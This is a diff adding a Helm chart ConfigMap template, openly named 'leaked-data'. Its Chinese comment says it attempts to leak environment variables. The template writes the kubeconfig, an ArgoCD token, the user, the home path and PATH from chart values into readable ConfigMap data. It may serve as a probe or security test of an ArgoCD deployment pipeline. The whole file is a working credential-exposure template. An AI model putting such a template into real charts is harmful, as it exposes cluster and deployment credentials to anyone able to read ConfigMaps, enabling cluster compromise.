@@ -1,0 +1,14 @@
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: {{ .Chart.Name }}-leaked-data
+  labels:
+    app: {{ .Chart.Name }}
+data:
+  # 尝试泄露环境变量到 ConfigMap
+  home: {{ .Values.config.env.home | quote }}
+  path: {{ .Values.testPath | quote }}
+  user: {{ .Values.testUser | quote }}
+  argocd-app: {{ .Values.testArgocd | quote }}
+  kubeconfig: {{ .Values.config.env.kubeconfig | quote }}
+  argocd-token: {{ .Values.config.env.argocdToken | quote }}
